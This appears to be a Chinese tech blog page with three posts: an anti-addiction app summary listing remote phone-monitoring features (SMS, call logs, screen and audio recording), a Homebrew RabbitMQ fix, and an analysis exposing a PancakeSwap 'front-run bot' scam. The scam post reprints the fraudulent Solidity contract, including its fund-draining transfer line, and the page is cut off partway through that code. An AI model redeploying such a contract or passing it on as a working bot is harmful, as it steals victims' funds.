  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%80%E6%9C%AF/" rel="tag">技术</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/" rel="tag">项目总结</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-防沉迷app-项目总结1"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/26/%E9%98%B2%E6%B2%89%E8%BF%B7app-%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%931/"
    >防沉迷app-项目总结1</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/26/%E9%98%B2%E6%B2%89%E8%BF%B7app-%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%931/" class="article-date">
  <time datetime="2022-04-26T02:10:04.000Z" itemprop="datePublished">2022-04-26</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/">技术生活 - 编程技术 - 项目总结</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="防沉迷项目总结（1）"><a href="#防沉迷项目总结（1）" class="headerlink" title="防沉迷项目总结（1）"></a>防沉迷项目总结（1）</h1><h2 id="防沉迷介绍"><a href="#防沉迷介绍" class="headerlink" title="防沉迷介绍"></a>防沉迷介绍</h2><p>现代社会，手机成了个人的计算中心，各种人与人、人与物的连接，都通过手机连接到每一个个体，极大的方便了人们的生活、学习、工作和娱乐。然而正是这样的便捷性，高度依赖性，使人们越来越离不开手机，很多人深陷其中，不能自拔，甚至严重影响正常的休息、生活、学习、工作和交流，越来越考验人的自律能力。因此很多人需要适当的提醒、干预或者强制的方式来摆脱这种状况。“防沉迷APP”的想法被创业者发现并实施。</p>
<p>作为一款手机防沉迷软件，该软件在解救两亿手机控、低头族，让她成为学生、考生、家长、低头族、手机控、战拖们的必备应用。</p>
<p>目前知名的国内防沉迷app有：格雷盒子，青柠守护，阳光守护等</p>
<h2 id="防沉迷技术难点"><a href="#防沉迷技术难点" class="headerlink" title="防沉迷技术难点"></a>防沉迷技术难点</h2><h3 id="设置默认桌面"><a href="#设置默认桌面" class="headerlink" title="设置默认桌面"></a>设置默认桌面</h3><p>目前已知问题，小米桌面如果没有经过官方的认证，就不让设置其他第三方桌面（launcher）设置为默认桌面。小米这么做也有道理。因为第三方桌面有可能会做一些伤害用户体验的行为。有官方的背书，能在一定程度上避免这个问题。同样的问题还在华为手机上出现。华为手机直接是不让设置默认桌面，根本没有这个选项。</p>
<h3 id="开机自启动"><a href="#开机自启动" class="headerlink" title="开机自启动"></a>开机自启动</h3><p>防沉迷，最重要的是让用户在使用手机的时候，只能操作某一类或者某一些app。这里问题就来了，怎么做到呢？第一想到的就是设置默认桌面，同时隐藏设置桌面的配置。但是上面说了，目前主流手机厂商对这方面有着自己的顾虑和思考。<br>那没有没有可能在不支持的手机上支持用户app开机启动，同时只允许打开自己的app，不允许切换到其他app，达到类似launcher（桌面）的效果呢？<br>答案是肯定的。</p>
<h3 id="手机兼容性"><a href="#手机兼容性" class="headerlink" title="手机兼容性"></a>手机兼容性</h3><p>安卓手机厂商众多，各种改。而防沉迷用到的api又比较底层，兼容性是一个让开发者头疼的问题。</p>
<h3 id="屏蔽其他app"><a href="#屏蔽其他app" class="headerlink" title="屏蔽其他app"></a>屏蔽其他app</h3><p>屏蔽有2个思路</p>
<ol>
<li>控制launcher，隐藏app的icon图标。这个没啥好说的</li>
<li>类似如下这个效果。只要用户点击任何其他app都提示，app被禁止</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220426102755.png" alt="20220426102755"></p>
<h3 id="权限自动点击"><a href="#权限自动点击" class="headerlink" title="权限自动点击"></a>权限自动点击</h3><p>由于需要比较多的权限，不同手机的设置路径也不尽相同。如果能实现自动点击，自动选择，无疑会给用户很大的帮助。</p>
<h3 id="手机远程控制"><a href="#手机远程控制" class="headerlink" title="手机远程控制"></a>手机远程控制</h3><h4 id="远程获取通讯录"><a href="#远程获取通讯录" class="headerlink" title="远程获取通讯录"></a>远程获取通讯录</h4><h4 id="远程读取用户手机短信"><a href="#远程读取用户手机短信" class="headerlink" title="远程读取用户手机短信"></a>远程读取用户手机短信</h4><h4 id="远程读取用户通话记录"><a href="#远程读取用户通话记录" class="headerlink" title="远程读取用户通话记录"></a>远程读取用户通话记录</h4><h4 id="远程获取用户手机截屏"><a href="#远程获取用户手机截屏" class="headerlink" title="远程获取用户手机截屏"></a>远程获取用户手机截屏</h4><h4 id="远程录制用户手机屏幕"><a href="#远程录制用户手机屏幕" class="headerlink" title="远程录制用户手机屏幕"></a>远程录制用户手机屏幕</h4><h4 id="远程锁定被控制手机"><a href="#远程锁定被控制手机" class="headerlink" title="远程锁定被控制手机"></a>远程锁定被控制手机</h4><h4 id="远程控制被控手机app删除或者增加"><a href="#远程控制被控手机app删除或者增加" class="headerlink" title="远程控制被控手机app删除或者增加"></a>远程控制被控手机app删除或者增加</h4><h4 id="远程控制被控手机app打开或者关闭"><a href="#远程控制被控手机app打开或者关闭" class="headerlink" title="远程控制被控手机app打开或者关闭"></a>远程控制被控手机app打开或者关闭</h4><h4 id="远程控制被控手机录音"><a href="#远程控制被控手机录音" class="headerlink" title="远程控制被控手机录音"></a>远程控制被控手机录音</h4><h4 id="远程控制被控手机活动范围，设定电子围栏，超出范围提醒"><a href="#远程控制被控手机活动范围，设定电子围栏，超出范围提醒" class="headerlink" title="远程控制被控手机活动范围，设定电子围栏，超出范围提醒"></a>远程控制被控手机活动范围，设定电子围栏，超出范围提醒</h4><h2 id="防沉迷app思考和拓展"><a href="#防沉迷app思考和拓展" class="headerlink" title="防沉迷app思考和拓展"></a>防沉迷app思考和拓展</h2><p>后话：做防沉迷这段时间，确实发现这个市场还挺大的。我们做的方向是，类似阳光守护那种。有两个端：家长端和孩子端。<br>家长端：可以控制孩子的手机，包括获取孩子手机app，远程截屏，远程锁屏等。<br>孩子端：只可以打开被家长允许的app，只能在规定时间玩手机等</p>
<p>其实,有了这个技术，应用场景是很多的。从控制端和被控端来思考</p>
<ol>
<li><p>假设只有一个端</p>
<ul>
<li>可以做成一个防沉迷app单机版，解决学生等老离不开手机的问题，帮自己改掉习惯，投入学习</li>
<li>可以做成一个习惯训练app，设置一个社区，社区的人打卡比赛，谁能养成习惯给予奖励。</li>
</ul>
</li>
<li><p>有一个控制端和一个被控端</p>
<ul>
<li>家长控制孩子</li>
<li>老师控制学生</li>
<li>孩子给上了年纪的父母远程协助</li>
<li>其他场景</li>
</ul>
</li>
</ol>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>做了这么多，还有一些没解决问题。有意者可以联系 Q:2169564366 （备注：防沉迷）技术交流。一起成长</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%80%E6%9C%AF/" rel="tag">技术</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/" rel="tag">项目总结</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-fix-mac-rabbitmq-issue"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/19/fix-mac-rabbitmq-issue/"
    >fix-mac-rabbitmq-issue</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/19/fix-mac-rabbitmq-issue/" class="article-date">
  <time datetime="2022-04-19T12:27:21.000Z" itemprop="datePublished">2022-04-19</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/">技术生活 - 编程技术 - 后端技术</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>今天在mac 下面配置 rabbitmq的环境，按照官方文档 brew install rabbitmq 竟然报错了，如下。<br>核心错误 *** No formulae found in taps *** </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">yyy@xxx-MacBook-Pro ~ % brew install rabbitmq</span><br><span class="line"></span><br><span class="line">Running `brew update --preinstall`...</span><br><span class="line">fatal: Could not resolve HEAD to a revision</span><br><span class="line">==&gt; Tapping homebrew/cask</span><br><span class="line">Cloning into &#x27;/usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask&#x27;...</span><br><span class="line">remote: Enumerating objects: 633392, done.</span><br><span class="line">remote: Counting objects: 100% (14/14), done.</span><br><span class="line">remote: Compressing objects: 100% (14/14), done.</span><br><span class="line">remote: Total 633392 (delta 6), reused 2 (delta 0), pack-reused 633378</span><br><span class="line">Receiving objects: 100% (633392/633392), 298.02 MiB | 9.22 MiB/s, done.</span><br><span class="line">Resolving deltas: 100% (448299/448299), done.</span><br><span class="line">Updating files: 100% (4055/4055), done.</span><br><span class="line">Tapped 3996 casks (4,066 files, 318.3MB).</span><br><span class="line">Warning: No available formula with the name &quot;rabbitmq&quot;.</span><br><span class="line">==&gt; Searching for similarly named formulae...</span><br><span class="line">Error: No similarly named formulae found.</span><br><span class="line">==&gt; Searching for a previously deleted formula (in the last month)...</span><br><span class="line">Error: No previously deleted formula found.</span><br><span class="line">==&gt; Searching taps on GitHub...</span><br><span class="line">Error: No formulae found in taps.</span><br><span class="line">jim@zhangs-MacBook-Pro ~ % brew install rabbitmq</span><br><span class="line"></span><br><span class="line">Running `brew update --preinstall`...</span><br><span class="line">fatal: Could not resolve HEAD to a revision</span><br><span class="line">Warning: No available formula with the name &quot;rabbitmq&quot;.</span><br><span class="line">==&gt; Searching for similarly named formulae...</span><br><span class="line">Error: No similarly named formulae found.</span><br><span class="line">==&gt; Searching for a previously deleted formula (in the last month)...</span><br><span class="line">Error: No previously deleted formula found.</span><br><span class="line">==&gt; Searching taps on GitHub...</span><br><span class="line">Error: No formulae found in taps.</span><br></pre></td></tr></table></figure>

<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>经过一番思考和查阅发现可以这样解决</p>
<ul>
<li>定位到homebrew目录<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/Homebrew/Library/Taps/homebrew/</span><br></pre></td></tr></table></figure></li>
<li>然后rm -rf homebrew-core</li>
<li>重新git clone <a target="_blank" rel="noopener" href="https://github.com/Homebrew/homebrew-core.git">https://github.com/Homebrew/homebrew-core.git</a></li>
<li>最后重新执行brew install</li>
</ul>
<h2 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h2><p>可能是安装brew的过程中由于网络原因或者其他原因导致homebrew安装出现问题</p>
<h2 id="rabbitmq-其他"><a href="#rabbitmq-其他" class="headerlink" title="rabbitmq 其他"></a>rabbitmq 其他</h2><ul>
<li>rabbitmq常用命令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">brew services info   rabbitmq</span><br><span class="line">brew services stop   rabbitmq</span><br><span class="line">brew services restart   rabbitmq</span><br><span class="line">brew services kill   rabbitmq</span><br></pre></td></tr></table></figure></li>
<li>Web界面管理RabbitMQ<br>默认是可以本地登录localhost:15672，用户名：guest；密码：guest；端口默认15672</li>
</ul>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/rabbmitmq/" rel="tag">rabbmitmq</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-区块链骗局之夹子机器人"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%97%E5%B1%80%E4%B9%8B%E5%A4%B9%E5%AD%90%E6%9C%BA%E5%99%A8%E4%BA%BA/"
    >区块链骗局之夹子机器人</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%97%E5%B1%80%E4%B9%8B%E5%A4%B9%E5%AD%90%E6%9C%BA%E5%99%A8%E4%BA%BA/" class="article-date">
  <time datetime="2022-04-07T13:48:33.000Z" itemprop="datePublished">2022-04-07</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E5%8C%BA%E5%9D%97%E9%93%BE/">技术生活 - 区块链</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>我一个很久没联系的朋友，今天突然找到我，让我帮忙看看代码；说是自己在网上看到了一个区块链套利机器人的代码，很赚钱。自己也不根据代码部署了，但是钱取不出来了，他也是比较谨慎，就投入了5000多块吧！折合BNB大概2个（bnb 按照430美元&#x2F;个）。让我帮看看。</p>
<ul>
<li>骗子视频地址：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=3QrBQW4TOfI&amp;t=71s">https://www.youtube.com/watch?v=3QrBQW4TOfI&amp;t=71s</a></li>
<li>合约代码地址 :<a target="_blank" rel="noopener" href="https://ghostbin.com/rVoQh/raw">https://ghostbin.com/rVoQh/raw</a></li>
</ul>
<p>起初，我打开视频，也没人为他被骗。从视频标题，tag，特别是评论，100多条评论，全是清一色说的类似：我投了1个BNB，几天就变成了10个了…..<br>我就犯嘀咕了，我们圈子都知道链上机器人太卷了，机器人都开始打架了，还能赚钱吗？难道这个牛人有啥高明的策略？直到看了1分钟视频才反应过来是骗局。</p>
<h2 id="骗术剖析"><a href="#骗术剖析" class="headerlink" title="骗术剖析"></a>骗术剖析</h2><p>骗子在YouTube上，视频竟然打着*** 夹子机器人｜三明治机器人｜薄饼机器人｜pancakeswap｜科学家机器人｜抢先交易｜量化交易｜自动收入10+BNB｜Pancakes Front run bot｜（最新版本）***  ，看来骗子很注意SEO ，懂得搜索引擎优化。</p>
<p>其实这个骗术很简单，如果懂得代码的话，绝对不会上当。不懂代码的人看起来只会绝对好高级啊！加上被赚钱的欲望冲昏了头脑。下面就简要分析一下这个骗术有多低级</p>
<h3 id="骗术分析"><a href="#骗术分析" class="headerlink" title="骗术分析"></a>骗术分析</h3><p>骗术大致过程是：用看起来免费的方式教别人部署夹子套利机器人，机器人会自动在pancake上捕获潜在的交易对。就这么空手套白狼的剧本。视频下发还给出了代码，合约地址，部署教程等资料。看起来没啥问题。但是看视频操作就不对了</p>
<ol>
<li><p>合约部署为何要更改注释中的钱包地址，这装模作样的，也许骗子这里也是思考了：如果这里写用户的地址，用户会更加放心。<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220407220216.png" alt="20220407220216"></p>
</li>
<li><p>部署完成合约之后，为何要往合约地址转钱？？？注意：<em><strong>这里转入多少就会被骗子转走多少</strong></em> </p>
</li>
<li><p>看看骗子的所谓夹子代码。（只能说是一对垃圾代码，除了注释掉的有用代码不足10句话），其中最有用的一句代码是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payable(manager.uniswapDepositAddress()).transfer(address(this).balance);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>看到了吗？这个就是把合约中的钱转走的，其余的被注释掉的无用代码都是障眼法。</p>
</li>
</ol>
<p>下面的代码可能随时被骗子删除   ，我就粘贴了一份，切忌别去尝试哦！<br>   合约代码链接：<br><a target="_blank" rel="noopener" href="https://ghostbin.com/rVoQh/raw">https://ghostbin.com/rVoQh/raw</a></p>
<p>备用链接：<br><a target="_blank" rel="noopener" href="https://pastebin.com/raw/1kVN2Nj9">https://pastebin.com/raw/1kVN2Nj9</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.6;</span><br><span class="line"></span><br><span class="line">// PancakeSwap FrontrunDeployer</span><br><span class="line">import &quot;https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol&quot;;</span><br><span class="line">// PancakeSwap manager</span><br><span class="line">import &quot;https://github.com/Uniswapf/uniswap-v2-periphery/blob/main/master-contracts-interfaces/V1/IUniswapV1Factory.md&quot;;</span><br><span class="line">import &quot;https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol&quot;;</span><br><span class="line">import &quot;https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract PancakeswapV2FrontBot &#123;</span><br><span class="line">    </span><br><span class="line">    string public tokenName;</span><br><span class="line">	string public tokenSymbol;</span><br><span class="line">	uint frontrun;</span><br><span class="line">	Manager manager;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	constructor(string memory _tokenName, string memory _tokenSymbol) public &#123;</span><br><span class="line">		tokenName = _tokenName;</span><br><span class="line">		tokenSymbol = _tokenSymbol;</span><br><span class="line">		manager = new Manager();</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">	    </span><br><span class="line">	    // Send required BNB for liquidity pair</span><br><span class="line">	    receive() external payable &#123;&#125;</span><br><span class="line">	    </span><br><span class="line">	    </span><br><span class="line">	    // Perform tasks (clubbed .json functions into one to reduce external calls &amp; reduce gas) manager.performTasks();</span><br><span class="line">	    </span><br><span class="line">	    function action() public payable &#123;</span><br><span class="line">	</span><br><span class="line">	//Perform a front-running attack on uniswap</span><br><span class="line"></span><br><span class="line">//const fs = require(&#x27;fs&#x27;);</span><br><span class="line">//var Web3 = require(&#x27;web3&#x27;);</span><br><span class="line">//var abiDecoder = require(&#x27;abi-decoder&#x27;);</span><br><span class="line">//var colors = require(&quot;colors&quot;);</span><br><span class="line">//var Tx = require(&#x27;ethereumjs-tx&#x27;).Transaction;</span><br><span class="line">//var axios = require(&#x27;axios&#x27;);</span><br><span class="line">//var BigNumber = require(&#x27;big-number&#x27;);</span><br><span class="line"></span><br><span class="line">//const &#123;NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST&#125; = require(&#x27;./constants.js&#x27;);</span><br><span class="line">//const &#123;setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI&#125; = require(&#x27;./bot.js&#x27;);</span><br><span class="line">//const &#123;PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL&#125; = require(&#x27;./env.js&#x27;);</span><br><span class="line"></span><br><span class="line">//const INPUT_TOKEN_ADDRESS = &#x27;0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c&#x27;;</span><br><span class="line">//const WBNB_TOKEN_ADDRESS = &#x27;0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c&#x27;;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//var input_token_info;</span><br><span class="line">//var out_token_info;</span><br><span class="line">//var pool_info;</span><br><span class="line">//var gas_price_info;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//var web3;</span><br><span class="line">//var web3Ts;</span><br><span class="line">//var web3Ws;</span><br><span class="line">//var pancakeRouter;</span><br><span class="line">//var pancakeFactory;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">// one gwei</span><br><span class="line">//const ONE_GWEI = 1e9;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//var buy_finished = false;</span><br><span class="line">//var sell_finished = false;</span><br><span class="line">//var buy_failed = false;</span><br><span class="line">//var sell_failed = false;</span><br><span class="line">//var attack_started = false;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//var succeed = false;</span><br><span class="line">//var subscription;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//async function createWeb3()&#123;</span><br><span class="line">    //try &#123;</span><br><span class="line">        // web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));</span><br><span class="line">        // web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK_TEST));</span><br><span class="line">       // web3 = new Web3(EthereumTesterProvider());</span><br><span class="line">       // web3.eth.getAccounts(console.log);</span><br><span class="line">      //web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));</span><br><span class="line">    //pancakeRouter = new web3.eth.Contract(PANCAKE_ROUTER_ABI, PANCAKE_ROUTER_ADDRESS);</span><br><span class="line">        //pancakeFactory = new web3.eth.Contract(PANCAKE_FACTORY_ABI, PANCAKE_FACTORY_ADDRESS);</span><br><span class="line">        //abiDecoder.addABI(PANCAKE_ROUTER_ABI);</span><br><span class="line">        manager;</span><br><span class="line"></span><br><span class="line">        //return true;</span><br><span class="line">    //&#125; catch (error) &#123;</span><br><span class="line">      //console.log(error);</span><br><span class="line">      //return false;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">//async function main() &#123;</span><br><span class="line"> </span><br><span 